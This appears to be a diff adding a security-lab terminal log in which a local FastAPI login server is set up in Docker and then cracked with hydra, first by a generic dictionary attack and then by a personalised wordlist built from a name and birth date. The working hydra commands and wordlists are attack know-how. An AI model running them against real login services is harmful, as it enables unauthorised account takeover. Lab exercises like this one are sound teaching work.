@@ -1,0 +1,168 @@
+### TERMINAL 1
+> docker run -it \
+  --name lab12-bruteforce \
+  -p 127.0.0.1:8001:8000 \
+  ubuntu:24.04 bash
+
+root@c8a3fee3e89c:/# apt update
+.....
+Fetched 35.7 MB in 6s
+Reading package lists... Done
+All packages are up to date.
+
+root@c8a3fee3e89c:/# apt install -y \
+  python3 python3-venv python3-pip hydra curl nano
+
+Reading package lists... Done
+.....
+0 upgraded, 188 newly installed, 0 to remove.
+Need to get 130 MB of archives.
+.....
+Setting up python3 ...
+Setting up hydra ...
+.....
+Processing triggers ...
+Done.
+
+root@c8a3fee3e89c:/# mkdir -p /opt/brute-force-server
+root@c8a3fee3e89c:/# cd /opt/brute-force-server
+root@c8a3fee3e89c:/opt/brute-force-server# python3 -m venv venv
+root@c8a3fee3e89c:/opt/brute-force-server# source venv/bin/activate
+
+(venv) root@c8a3fee3e89c:/opt/brute-force-server# pip install "fastapi[standard]"
+Collecting fastapi[standard]
+.....
+Successfully installed fastapi-0.162.0 uvicorn-0.54.0 ...
+
+(venv) root@c8a3fee3e89c:/opt/brute-force-server# nano main.py
+
+(venv) root@c8a3fee3e89c:/opt/brute-force-server# python -m uvicorn main:app --host 0.0.0.0 --port 8000
+
+INFO: Started server process [4574]
+INFO: Waiting for application startup.
+INFO: Application startup complete.
+INFO: Uvicorn running on http://0.0.0.0:8000
+.....
+INFO: 127.0.0.1 - "POST /login HTTP/1.1" 200 OK
+.....
+INFO: 127.0.0.1 - "POST /login HTTP/1.0" 200 OK
+.....
+
+# Server stopped with Ctrl+C to update password
+
+^C
+.....
+KeyboardInterrupt
+.....
+
+(venv) root@c8a3fee3e89c:/opt/brute-force-server# nano main.py
+
+(venv) root@c8a3fee3e89c:/opt/brute-force-server# python -m uvicorn main:app --host 0.0.0.0 --port 8000
+
+INFO: Started server process [4601]
+INFO: Waiting for application startup.
+INFO: Application startup complete.
+INFO: Uvicorn running on http://0.0.0.0:8000
+.....
+INFO: 127.0.0.1 - "POST /login HTTP/1.0" 200 OK
+.....
+
+
+### TERMINAL 2
+
+> docker exec -it lab12-bruteforce bash
+
+root@c8a3fee3e89c:/# cd /opt/brute-force-server
+
+root@c8a3fee3e89c:/opt/brute-force-server# curl -X POST http://127.0.0.1:8000/login \
+  -d "username=admin&password=wrong"
+"Invalid credentials"
+
+root@c8a3fee3e89c:/opt/brute-force-server# curl -X POST http://127.0.0.1:8000/login \
+  -d "username=admin&password=12345admin"
+"secret token"
+
+root@c8a3fee3e89c:/opt/brute-force-server# cat > usernames.txt << 'EOF'
+root
+user
+admin
+guest
+EOF
+
+root@c8a3fee3e89c:/opt/brute-force-server# cat > passwords.txt << 'EOF'
+password
+123456
+admin
+admin123
+12345admin
+qwerty
+EOF
+
+# Attack 1: Dictionary Attack
+
+root@c8a3fee3e89c:/opt/brute-force-server# hydra -f -I -V -t 2 \
+  -L usernames.txt \
+  -P passwords.txt \
+  -s 8000 \
+  127.0.0.1 \
+  http-post-form \
+  "/login:username=^USER^&password=^PASS^:F=Invalid"
+
+Hydra v9.5
+[DATA] max 2 tasks per 1 server, 24 login tries (l:4/p:6)
+[DATA] attacking http-post-form://127.0.0.1:8000/login
+[ATTEMPT] login "root" - pass "password" - 1 of 24
+.....
+[ATTEMPT] login "admin" - pass "12345admin" - 17 of 24
+.....
+
+[8000][http-post-form] host: 127.0.0.1
+login: admin  password: 12345admin
+[STATUS] attack finished for 127.0.0.1 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+
+# Attack 2: Personalized Dictionary Attack
+
+root@c8a3fee3e89c:/opt/brute-force-server# nano generate_passwords.py
+
+root@c8a3fee3e89c:/opt/brute-force-server# python3 generate_passwords.py
+Generated 8 passwords
+
+root@c8a3fee3e89c:/opt/brute-force-server# cat profile_passwords.txt
+alex
+morgan
+alex2001
+alex1204
+morgan2001
+morgan1204
+Alex2001
+alex2001!
+
+root@c8a3fee3e89c:/opt/brute-force-server# nano main.py
+
+# Server restarted in Terminal 1 with updated password
+
+root@c8a3fee3e89c:/opt/brute-force-server# hydra -f -I -V -t 2 \
+  -l admin \
+  -P profile_passwords.txt \
+  -s 8000 \
+  127.0.0.1 \
+  http-post-form \
+  "/login:username=^USER^&password=^PASS^:F=Invalid"
+
+Hydra v9.5
+[DATA] max 2 tasks per 1 server, 8 login tries (l:1/p:8)
+[DATA] attacking http-post-form://127.0.0.1:8000/login
+
+[ATTEMPT] login "admin" - pass "alex" - 1 of 8
+[ATTEMPT] login "admin" - pass "morgan" - 2 of 8
+[ATTEMPT] login "admin" - pass "alex2001" - 3 of 8
+.....
+
+[8000][http-post-form] host: 127.0.0.1
+login: admin  password: alex2001
+[STATUS] attack finished for 127.0.0.1 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+
+root@c8a3fee3e89c:/opt/brute-force-server#
+
